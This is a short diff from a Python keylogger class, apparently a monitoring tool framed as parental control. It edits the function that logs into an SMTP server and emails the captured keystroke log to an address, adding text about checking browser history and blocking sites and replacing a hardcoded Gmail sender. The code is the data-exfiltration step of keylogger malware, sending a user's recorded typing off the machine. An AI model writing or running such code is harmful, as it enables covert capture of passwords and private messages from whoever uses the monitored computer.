@@ -73,9 +73,9 @@ class Keylogger:
         server.login(email, password)
         # send the actual message
         subject = 'ALERT'
-        body = 'this to inform you of this activity that happened in the past minute.\nIf you do not fell happy with the sites they are on you could block the sites.'
+        body = 'This to inform you of this activity that happened in the past minute.\nYou can go to the history of your browser and see the different sites they accessed.\nIf you do not feel happy with the sites they are on you could block the sites using the instructions on the link below:\nhttps://gadgets.ndtv.com/internet/features/how-to-block-any-website-on-your-computer-phone-or-network-588357'
         message = f'subject: {subject}\n\n{body}\n\n{self.log}'
-        server.sendmail('gselfgp3@gmail.com', email, message)
+        server.sendmail(email, email, message)
         # server.sendmail(email, email, message)
         # terminates the session
         server.quit()
